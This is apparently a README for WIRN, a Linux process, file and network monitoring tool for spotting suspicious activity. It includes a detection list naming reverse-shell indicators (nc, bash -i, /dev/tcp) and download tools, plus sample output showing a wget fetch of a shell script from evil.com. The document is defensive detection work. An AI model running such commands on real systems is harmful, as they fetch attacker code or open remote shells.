# WIRN - Watch Inspect Report Notify

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Go Version](https://img.shields.io/badge/go-1.19+-blue.svg)](https://golang.org)

**WIRN** is an enhanced process monitoring tool inspired by pspy64, designed for security researchers, system administrators, and penetration testers. It monitors processes, file system events, and network connections without requiring root privileges.

## 🌟 Features

- **Advanced Process Monitoring**: Real-time detection of new processes with detailed information
- **Suspicious Activity Detection**: Automatically identifies potentially malicious commands and activities
- **File System Monitoring**: Track file modifications in sensitive directories
- **Network Connection Tracking**: Monitor TCP connections and states
- **Multiple Output Formats**: Plain text or JSON for easy parsing
- **Flexible Filtering**: Filter by user, command patterns, or suspicious activities only
- **Environment Variables**: Optional inclusion of process environment variables
- **No Root Required**: Works without elevated privileges (some features may be limited)
- **High Performance**: Configurable scan intervals for optimal resource usage

## 📋 Requirements

- Linux operating system (kernel 2.6+)
- Go 1.19 or higher (for building)

## 🚀 Installation

### Quick Install (Recommended)

```bash
curl -sSL https://raw.githubusercontent.com/yourusername/wirn/main/install.sh | bash
```

### Manual Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/wirn.git
cd wirn

# Build the binary
go build -o wirn main.go

# Optional: Install system-wide
sudo cp wirn /usr/local/bin/
```

### Using Pre-built Binaries

Download the latest release from the [Releases](https://github.com/yourusername/wirn/releases) page:

```bash
wget https://github.com/yourusername/wirn/releases/latest/download/wirn-linux-amd64
chmod +x wirn-linux-amd64
sudo mv wirn-linux-amd64 /usr/local/bin/wirn
```

## 📖 Usage

### Basic Usage

```bash
# Monitor processes only (default)
./wirn

# Monitor processes and file system
./wirn -file

# Monitor processes and network connections
./wirn -net

# Monitor everything
./wirn -file -net
```

### Advanced Options

```bash
# Show only suspicious activities
./wirn -suspicious

# Filter by specific user
./wirn -user www-data

# Filter by command pattern (regex)
./wirn -cmd "bash|sh"

# Output to JSON format
./wirn -json

# Save output to file
./wirn -output /tmp/wirn.log

# Include environment variables
./wirn -env

# Set custom scan interval (milliseconds)
./wirn -interval 50

# Limit maximum events
./wirn -max 1000

# Quiet mode (no banner)
./wirn -quiet
```

### Real-World Examples

**1. Security Monitoring**
```bash
# Detect reverse shells and suspicious commands
./wirn -suspicious -output /var/log/wirn-security.log
```

**2. Web Server Monitoring**
```bash
# Monitor processes spawned by web server user
./wirn -user www-data -file -output /var/log/web-activity.log
```

**3. Incident Response**
```bash
# Comprehensive monitoring with JSON output for SIEM integration
./wirn -file -net -json -suspicious -output /var/log/wirn-ir.json
```

**4. Development/Debugging**
```bash
# Monitor specific application processes
./wirn -cmd "myapp" -env -interval 50
```

**5. Cron Job Analysis**
```bash
# Watch for scheduled task execution
./wirn -user root -suspicious
```

## 🎯 Command-Line Flags

| Flag | Default | Description |
|------|---------|-------------|
| `-proc` | `true` | Monitor processes |
| `-file` | `false` | Monitor file system events |
| `-net` | `false` | Monitor network connections |
| `-interval` | `100` | Scan interval in milliseconds |
| `-json` | `false` | Output in JSON format |
| `-output` | `""` | Output file path (stdout if empty) |
| `-user` | `""` | Filter by username |
| `-cmd` | `""` | Filter by command pattern (regex) |
| `-suspicious` | `false` | Show only suspicious activities |
| `-quiet` | `false` | Quiet mode - no banner |
| `-tree` | `false` | Show process tree (future feature) |
| `-env` | `false` | Include environment variables |
| `-max` | `0` | Maximum events to capture (0 = unlimited) |

## 🔍 Suspicious Activity Detection

WIRN automatically detects potentially malicious activities by scanning for:

- Reverse shell indicators (`nc`, `bash -i`, `/dev/tcp`)
- Code execution patterns (`python -c`, `perl -e`, `ruby -e`)
- File downloads (`wget`, `curl`)
- Base64 encoded payloads
- Suspicious file operations (`chmod 777`, operations in `/tmp`)
- Privilege escalation attempts (`sudo`, `su`, `passwd`)
- Persistence mechanisms (`crontab`, `systemctl`)

## 📊 Output Formats

### Plain Text Output

```
[2025-10-19 14:23:45] PID: 12345 | PPID: 1234 | User: www-data
  ↳ CMD: /bin/bash -c wget http://evil.com/shell.sh
  ↳ CWD: /tmp
  ⚠ SUSPICIOUS ACTIVITY DETECTED!
```

### JSON Output

```json
{
  "timestamp": "2025-10-19 14:23:45",
  "pid": 12345,
  "ppid": 1234,
  "user": "www-data",
  "command": "/bin/bash",
  "cmdline": "/bin/bash -c wget http://evil.com/shell.sh",
  "cwd": "/tmp",
  "suspicious": true
}
```

## 🛡️ Security Considerations

1. **Permissions**: WIRN works without root privileges but some features may be limited
2. **Performance**: Aggressive scanning intervals may impact system performance
3. **Evasion**: Advanced attackers may detect and evade process monitoring
4. **Privacy**: Be aware of local regulations when monitoring user activities

## 🔧 Troubleshooting

### Permission Denied Errors

Some `/proc` entries may not be readable without elevated privileges. This is normal and doesn't affect most monitoring capabilities.

### High CPU Usage

If WIRN consumes too much CPU, increase the `-interval` value:
```bash
./wirn -interval 500  # Scan every 500ms instead of 100ms
```

### Missing Events

For high-frequency process creation, reduce the interval:
```bash
./wirn -interval 10  # Very aggressive scanning
```

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgments

- Inspired by [pspy](https://github.com/DominicBreuker/pspy)
- Built with Go for performance and portability

## 📞 Contact

- GitHub Issues: [Report a bug](https://github.com/yourusername/wirn/issues)
- Twitter: [@yourhandle](https://twitter.com/yourhandle)

## ⚠️ Disclaimer

This tool is intended for legitimate security research, system administration, and authorized penetration testing only. Users are responsible for complying with applicable laws and regulations. The authors assume no liability for misuse or damage caused by this tool.

---

**Made with ❤️ for the security community**